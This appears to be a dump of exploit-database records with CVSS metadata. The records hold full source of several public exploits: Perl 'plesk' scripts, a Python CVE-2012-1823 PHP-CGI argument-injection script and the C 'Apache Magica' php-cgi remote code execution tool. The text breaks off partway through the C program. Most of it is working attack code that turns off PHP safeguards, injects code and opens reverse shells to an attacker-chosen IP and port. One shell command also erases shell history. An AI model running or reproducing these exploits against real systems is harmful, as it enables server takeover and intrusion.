uri_escape(&#34;disable_functions=\\&#34;\\&#34;&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;open_basedir=none&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;auto_prepend_file=php://input&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-n&#34;,&#34;\\0-\\377&#34;);\r\n$path = uri_escape(&#34;phppath&#34;,&#34;\\0-\\377&#34;) . &#34;/&#34; . uri_escape(&#34;php&#34;,&#34;\\0-\\377&#34;);\r\nprint $sock &#34;POST /$path?$arguments HTTP/1.1\\r\\n&#34;\r\n           .&#34;Host: $ARGV[0]\\r\\n&#34;\r\n           .&#34;User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\\r\\n&#34;           \r\n           .&#34;Content-Type: application/x-www-form-urlencoded\\r\\n&#34;\r\n           .&#34;Content-Length: &#34;. length($pwn) .&#34;\\r\\n\\r\\n&#34; . $pwn;\r\nwhile(&#60;$sock&#62;) {\r\n        print;\r\n}\r\n#CentOS/Redhat Linux: yum install perl-IO-Socket-SSL.noarch\r\n\r\n\r\n###############################################################################################################\r\n\r\nplesk-simple.pl\r\n\r\n\r\n#plesk remote exploit by kingcope\r\n#all your base belongs to me :&#62;\r\nuse IO::Socket;\r\nuse URI::Escape;\r\n$sock = IO::Socket::INET-&#62;new(PeerAddr =&#62; $ARGV[0],\r\n                              PeerPort =&#62; 80,\r\n                              Proto    =&#62; &#39;tcp&#39;);\r\n$pwn = &#39;&#60;?php echo &#34;Content-Type:text/html\\r\\n\\r\\n&#34;;echo &#34;OK\\n&#34;;system(&#34;uname -a;id;&#34;); ?&#62;&#39;;\r\n$arguments = uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;allow_url_include=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;safe_mode=off&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;suhosin.simulation=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;disable_functions=\\&#34;\\&#34;&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;open_basedir=none&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;auto_prepend_file=php://input&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-n&#34;,&#34;\\0-\\377&#34;);\r\n$path = uri_escape(&#34;phppath&#34;,&#34;\\0-\\377&#34;) . &#34;/&#34; . uri_escape(&#34;php&#34;,&#34;\\0-\\377&#34;);\r\nprint $sock &#34;POST /$path?$arguments HTTP/1.1\\r\\n&#34;\r\n           .&#34;Host: $ARGV[0]\\r\\n&#34;\r\n           .&#34;User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\\r\\n&#34;\r\n           .&#34;Content-Type: application/x-www-form-urlencoded\\r\\n&#34;\r\n           .&#34;Content-Length: &#34;. length($pwn) .&#34;\\r\\n\\r\\n&#34; . $pwn;\r\nwhile(&#60;$sock&#62;) {\r\n        print;\r\n}\r\n\r\n\r\n###############################################################################################################\r\n\r\nplesk.pl\r\n\r\n#plesk remote exploit by kingcope\r\n#all your base belongs to me :&#62;\r\nuse IO::Socket;\r\nuse IO::Socket::SSL;\r\nuse URI::Escape;\r\nsub usage {\r\n print &#34;usage: $0 &#60;target&#62; &#60;http/https&#62; &#60;local_ip&#62; &#60;local_port&#62;\\n&#34;;exit;\r\n}\r\nif (!defined($ARGV[3])){usage();}\r\n$target=$ARGV[0];\r\n$proto=$ARGV[1];\r\nif ($proto eq &#34;http&#34;) {\r\n$sock = IO::Socket::INET-&#62;new(\r\n PeerAddr =&#62; $ARGV[0],\r\n PeerPort =&#62; 80,\r\n Proto =&#62; &#39;tcp&#39;);\r\n}elsif ($proto eq &#34;https&#34;) {\r\n$sock = IO::Socket::SSL-&#62;new(\r\n PeerAddr =&#62; $ARGV[0],\r\n PeerPort =&#62; 443,\r\n Proto =&#62; &#39;tcp&#39;);\r\n}else {usage();}\r\n$lip=$ARGV[2];\r\n$lport=$ARGV[3];\r\n$pwn=&#34;&#60;?php echo \\&#34;Content-Type: text/plain\\r\\n\\r\\n\\&#34;;set_time_limit (0); \\$VERSION = \\&#34;1.0\\&#34;; \\$ip =\r\n&#39;$lip&#39;;  \\$port = $lport; \\$chunk_size = 1400; \\$write_a = null;\r\n\\$error_a = null; \\$shell = &#39;/bin/sh -i&#39;; \\$daemon =\r\n0;\\$debug = 0; if (function_exists(&#39;pcntl_fork&#39;)) { \\$pid =\r\npcntl_fork(); if (\\$pid == -1) { printit(\\&#34;ERROR: Can&#39;t fork\\&#34;);\r\nexit(1);} if (\\$pid) { exit(0);} if (posix_setsid() == -1) {\r\nprintit(\\&#34;Error: Can&#39;t setsid()\\&#34;); exit(1); } \\$daemon = 1;} else {\r\nprintit(\\&#34;WARNING: Failed to daemonise.  This is quite common and not\r\nfatal.\\&#34;);}chdir(\\&#34;/\\&#34;); umask(0); \\$sock = fsockopen(\\$ip, \\$port,\r\n\\$errno, \\$errstr, 30);if (!\\$sock) { printit(\\&#34;\\$errstr (\\$errno)\\&#34;);\r\nexit(1);} \\$descriptorspec = array(0 =&#62; array(\\&#34;pipe\\&#34;, \\&#34;r\\&#34;),1 =&#62;\r\narray(\\&#34;pipe\\&#34;, \\&#34;w\\&#34;), 2 =&#62; array(\\&#34;pipe\\&#34;, \\&#34;w\\&#34;));\\$process =\r\nproc_open(\\$shell, \\$descriptorspec, \\$pipes);if\r\n(!is_resource(\\$process)) { printit(\\&#34;ERROR: Can&#39;t spawn shell\\&#34;);\r\nexit(1);}stream_set_blocking(\\$pipes[0],\r\n0);stream_set_blocking(\\$pipes[1], 0);stream_set_blocking(\\$pipes[2],\r\n0);stream_set_blocking(\\$sock, 0);while (1) {    if (feof(\\$sock)) {\r\nprintit(\\&#34;done.\\&#34;); break;} if\r\n(feof(\\$pipes[1])) {printit(\\&#34;done.\\&#34;);break;}\\$read_a = array(\\$sock, \\$pipes[1],\r\n\\$pipes[2]);\\$num_changed_sockets = stream_select(\\$read_a, \\$write_a,\r\n\\$error_a, null);if (in_array(\\$sock, \\$read_a)) {if (\\$debug)\r\nprintit(\\&#34;SOCK READ\\&#34;);\\$input = fread(\\$sock,\r\n\\$chunk_size);if(\\$debug) printit(\\&#34;SOCK:\r\n\\$input\\&#34;);fwrite(\\$pipes[0], \\$input);}if (in_array(\\$pipes[1],\r\n\\$read_a)) {if (\\$debug) printit(\\&#34;STDOUT READ\\&#34;);\\$input =\r\nfread(\\$pipes[1], \\$chunk_size);if (\\$debug) printit(\\&#34;STDOUT:\r\n\\$input\\&#34;);fwrite(\\$sock, \\$input);}if (in_array(\\$pipes[2],\r\n\\$read_a)) {if (\\$debug) printit(\\&#34;STDERR READ\\&#34;);\\$input =\r\nfread(\\$pipes[2], \\$chunk_size);    if (\\$debug) printit(\\&#34;STDERR:\r\n\\$input\\&#34;);fwrite(\\$sock,\r\n\\$input);}}fclose(\\$sock);fclose(\\$pipes[0]);fclose(\\$pipes[1]);fclose(\\$pipes[2]);proc_close(\\$process);function printit (\\$string) {if (!\\$daemon) {print\r\n\\&#34;\\$string\\n\\&#34;;}}\r\n?&#62;&#34;;\r\n$arguments=uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;allow_url_include=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;safe_mode=off&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;suhosin.simulation=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;disable_functions=\\&#34;\\&#34;&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;open_basedir=none&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;auto_prepend_file=php://input&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n uri_escape(&#34;-n&#34;,&#34;\\0-\\377&#34;);\r\n$path=uri_escape(&#34;phppath&#34;,&#34;\\0-\\377&#34;). &#34;/&#34; . uri_escape(&#34;php&#34;,&#34;\\0-\\377&#34;);\r\nprint $sock &#34;POST /$path?$arguments HTTP/1.1\\r\\n&#34;.\r\n &#34;Host: $ARGV[0]\\r\\n&#34;.\r\n &#34;User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\\r\\n&#34;.\r\n &#34;Content-Type: text/plain\\r\\n&#34;.\r\n &#34;Content-Length: &#34;. length($pwn) .&#34;\\r\\n\\r\\n&#34;. $pwn;\r\nwhile(&#60;$sock&#62;){print $_;};\r\n\r\n\r\n###############################################################################################################\r\n\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:79637"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-72860",
            "id": "SSV:72860",
            "title": "PHP CGI Argument Injection Exploit",
            "type": "seebug",
            "sourceData": "\n                                                ######################################################################################\r\n# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit\r\n# Date: May 4, 2012\r\n# Author: rayh4c[0x40]80sec[0x2e]com\r\n# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com\r\n######################################################################################\r\n\r\nimport socket\r\nimport sys\r\n\r\ndef cgi_exploit():\r\n        pwn_code = &#34;&#34;&#34;&#60;?php phpinfo();?&#62;&#34;&#34;&#34; \r\n        post_Length = len(pwn_code)\r\n        http_raw=&#34;&#34;&#34;POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%s\r\n&#34;&#34;&#34; %(HOST , post_Length ,pwn_code)\r\n        print http_raw\r\n        try:\r\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            sock.connect((HOST, int(PORT)))\r\n            sock.send(http_raw)\r\n            data = sock.recv(10000)\r\n            print repr(data)\r\n            sock.close()\r\n        except socket.error, msg:\r\n            sys.stderr.write(&#34;[ERROR] %s\\n&#34; % msg[1])\r\n            sys.exit(1)\r\n               \r\nif __name__ == &#39;__main__&#39;:\r\n        try:\r\n            HOST = sys.argv[1]\r\n            PORT = sys.argv[2]\r\n            cgi_exploit()\r\n        except IndexError:\r\n            print &#39;[+]Usage: cgi_test.py site.com 80&#39;\r\n            sys.exit(-1)\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:72860"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-82805",
            "id": "SSV:82805",
            "title": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit",
            "type": "seebug",
            "sourceData": "\n                                                /* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /&#39;\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n &#39;//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\&#39;\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include &#60;stdio.h&#62;\r\n#include &#60;stdlib.h&#62;\r\n#include &#60;unistd.h&#62;\r\n#include &#60;getopt.h&#62;\r\n#include &#60;sys/types.h&#62;\r\n#include &#60;stddef.h&#62;\r\n#include &#60;openssl/rand.h&#62;\r\n#include &#60;openssl/ssl.h&#62;\r\n#include &#60;openssl/err.h&#62;\r\n#include &#60;netdb.h&#62;\r\n#include &#60;sys/socket.h&#62;\r\n#include &#60;netinet/in.h&#62;\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(&#34;usage: %s &#60;--target target&#62; &#60;--port port&#62; &#60;--protocol http|https&#62; &#34; \\\r\n  &#34;&#60;--reverse-ip ip&#62; &#60;--reverse-port port&#62; [--force-interpreter interpreter]\\n&#34;,\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = &#34;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&#34; \\\r\n &#34;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&#34; \\\r\n &#34;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&#34; \\\r\n &#34;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&#34; \\\r\n &#34;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&#34; \\\r\n &#34;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&#34; \\\r\n &#34;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&#34; \\\r\n &#34;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&#34; \\\r\n &#34;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&#34; \\\r\n &#34;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&#34; \\\r\n &#34;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&#34; \\\r\n &#34;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n&#34; \\\r\n &#34;Host: %s\\r\\n&#34; \\\r\n &#34;User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26&#34; \\\r\n &#34;(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n&#34; \\\r\n &#34;Content-Type: application/x-www-form-urlencoded\\r\\n&#34; \\\r\n &#34;Content-Length: %d\\r\\n&#34; \\\r\n &#34;Connection: close\\r\\n\\r\\n%s&#34;;\r\nchar phpstr[] = &#34;&#60;?php\\n&#34; \\\r\n&#34;set_time_limit(0);\\n&#34; \\\r\n&#34;$ip = &#39;%s&#39;;\\n&#34; \\\r\n&#34;$port = %d;\\n&#34; \\\r\n&#34;$chunk_size = 1400;\\n&#34; \\\r\n&#34;$write_a = null;\\n&#34; \\\r\n&#34;$error_a = null;\\n&#34; \\\r\n&#34;$shell = &#39;unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i&#39;;\\n&#34; \\\r\n&#34;$daemon = 0;\\n&#34; \\\r\n&#34;$debug = 0;\\n&#34; \\\r\n&#34;if (function_exists(&#39;pcntl_fork&#39;)) {\\n&#34; \\\r\n&#34;\t$pid = pcntl_fork();\t\\n&#34; \\\r\n&#34;\tif ($pid == -1) {\\n&#34; \\\r\n&#34;\t\tprintit(\\&#34;ERROR: Can&#39;t fork\\&#34;);\\n&#34; \\\r\n&#34;\t\texit(1);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\tif ($pid) {\\n&#34; \\\r\n&#34;\t\texit(0);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\tif (posix_setsid() == -1) {\\n&#34; \\\r\n&#34;\t\tprintit(\\&#34;Error: Can&#39;t setsid()\\&#34;);\\n&#34; \\\r\n&#34;\t\texit(1);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\t$daemon = 1;\\n&#34; \\\r\n&#34;} else {\\n&#34; \\\r\n&#34;\tprintit(\\&#34;WARNING: Failed to daemonise.\\&#34;);\\n&#34; \\\r\n&#34;}\\n&#34; \\\r\n&#34;chdir(\\&#34;/\\&#34;);\\n&#34; \\\r\n&#34;umask(0);\\n&#34; \\\r\n&#34;$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n&#34; \\\r\n&#34;if (!$sock) {\\n&#34; \\\r\n&#34;\tprintit(\\&#34;$errstr ($errno)\\&#34;);\\n&#34; \\\r\n&#34;\texit(1);\\n&#34; \\\r\n&#34;}\\n&#34; \\\r\n&#34;$descriptorspec = array(\\n&#34; \\\r\n&#34;   0 =&#62; array(\\&#34;pipe\\&#34;, \\&#34;r\\&#34;),\\n&#34; \\\r\n&#34;   1 =&#62; array(\\&#34;pipe\\&#34;, \\&#34;w\\&#34;),\\n&#34; \\\r\n&#34;   2 =&#62; array(\\&#34;pipe\\&#34;, \\&#34;w\\&#34;)\\n&#34; \\\r\n&#34;);\\n&#34; \\\r\n&#34;$process = proc_open($shell, $descriptorspec, $pipes);\\n&#34; \\\r\n&#34;if (!is_resource($process)) {\\n&#34; \\\r\n&#34;\tprintit(\\&#34;ERROR: Can&#39;t spawn shell\\&#34;);\\n&#34; \\\r\n&#34;\texit(1);\\n&#34; \\\r\n&#34;}\\n&#34; \\\r\n&#34;stream_set_blocking($pipes[0], 0);\\n&#34; \\\r\n&#34;stream_set_blocking($pipes[1], 0);\\n&#34; \\\r\n&#34;stream_set_blocking($pipes[2], 0);\\n&#34; \\\r\n&#34;stream_set_blocking($sock, 0);\\n&#34; \\\r\n&#34;while (1) {\\n&#34; \\\r\n&#34;\tif (feof($sock)) {\\n&#34; \\\r\n&#34;\t\tprintit(\\&#34;ERROR: Shell connection terminated\\&#34;);\\n&#34; \\\r\n&#34;\t\tbreak;\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\tif (feof($pipes[1])) {\\n&#34; \\\r\n&#34;\t\tprintit(\\&#34;ERROR: Shell process terminated\\&#34;);\\n&#34; \\\r\n&#34;\t\tbreak;\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n&#34; \\\r\n&#34;\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n&#34; \\\r\n&#34;\tif (in_array($sock, $read_a)) {\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;SOCK READ\\&#34;);\\n&#34; \\\r\n&#34;\t\t$input = fread($sock, $chunk_size);\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;SOCK: $input\\&#34;);\\n&#34; \\\r\n&#34;\t\tfwrite($pipes[0], $input);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\tif (in_array($pipes[1], $read_a)) {\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;STDOUT READ\\&#34;);\\n&#34; \\\r\n&#34;\t\t$input = fread($pipes[1], $chunk_size);\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;STDOUT: $input\\&#34;);\\n&#34; \\\r\n&#34;\t\tfwrite($sock, $input);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;\tif (in_array($pipes[2], $read_a)) {\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;STDERR READ\\&#34;);\\n&#34; \\\r\n&#34;\t\t$input = fread($pipes[2], $chunk_size);\\n&#34; \\\r\n&#34;\t\tif ($debug) printit(\\&#34;STDERR: $input\\&#34;);\\n&#34; \\\r\n&#34;\t\tfwrite($sock, $input);\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;}\\n&#34; \\\r\n&#34;\\n&#34; \\\r\n&#34;fclose($sock);\\n&#34; \\\r\n&#34;fclose($pipes[0]);\\n&#34; \\\r\n&#34;fclose($pipes[1]);\\n&#34; \\\r\n&#34;fclose($pipes[2]);\\n&#34; \\\r\n&#34;proc_close($process);\\n&#34; \\\r\n&#34;function printit ($string) {\\n&#34; \\\r\n&#34;\tif (!$daemon) {\\n&#34; \\\r\n&#34;\t\tprint \\&#34;$string\\n\\&#34;;\\n&#34; \\\r\n&#34;\t}\\n&#34; \\\r\n&#34;}\\n&#34; \\\r\n&#34;exit(1);\\n&#34; \\\r\n&#34;?&#62;&#34;;\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  printf(&#34;Hostname cannot be resolved\\n&#34;);\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n\tprintf(&#34;malloc error (1)\\n&#34;);\r\n\texit(255);\r\n }\r\n memset(&server, &#39;\\0&#39;, sizeof(struct sockaddr_in));\r\n memcpy(&server.sin_addr, he-&#62;h_addr_list[0],  he-&#62;h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c-&#62;handle, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 &#62; 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 &#62; 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(&#34;-== Apache Magika by Kingcope ==-\\n&#34;);\r\n  for(;;)\r\n  {\r\n\t int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n\t   {&#34;target&#34;, required_argument, 0, 0 },\r\n\t   {&#34;port&#34;, required_argument, 0, 0 },\r\n\t   {&#34;protocol&#34;, required_argument, 0, 0 },\r\n\t   {&#34;reverse-ip&#34;, required_argument, 0, 0 },\r\n\t   {&#34;reverse-port&#34;, required_argument, 0, 0 },\r\n\t   {&#34;force-interpreter&#34;, required_argument, 0, 0 },\t   \r\n\t   {0, 0, 0, 0 }\r\n\t  };\r\n\t \r\n\t c = getopt_long(argc, argv, &#34;&#34;, long_options, &option_index);\r\n     if (c &#60; 0)\r\n     \tbreak;\r\n     \r\n     switch (c) {\r\n\t case 0:\r\n\t  switch (option_index) {\r\n\t   case 0:\r\n\t    if (optarg) {\r\n\t     target = calloc(strlen(optarg)+1, sizeof(char));\r\n\t     if (!target) {\r\n\t\t  printf(&#34;calloc error (2)\\n&#34;);\r\n\t      exit(255);\r\n         }\r\n\t     memcpy(target, optarg, strlen(optarg)+1);\r\n    \t}\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n\t     port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n\t     printf(&#34;calloc error (3)\\n&#34;);\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, &#34;https&#34;))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n\t     printf(&#34;calloc error (4)\\n&#34;);\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n\t    reverseport = atoi(optarg);       \r\n\t\treverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n\t     printf(&#34;calloc error (5)\\n&#34;);\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);  \t     \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n\t     printf(&#34;calloc error (6)\\n&#34;);\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n\t  }\r\n\t  break;\r\n\t \r\n\t default:\r\n\t  usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind &#60; argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n\tusage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(&#34;Error while resolving hostname. (7)\\n&#34;);\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(&#34;/cgi-bin/php&#34;);\r\n  interpreters[1] = strdup(&#34;/cgi-bin/php5&#34;);\r\n  interpreters[2] = strdup(&#34;/cgi-bin/php-cgi&#34;);\r\n  interpreters[3] = strdup(&#34;/cgi-bin/php.cgi&#34;);\r\n  interpreters[4] = 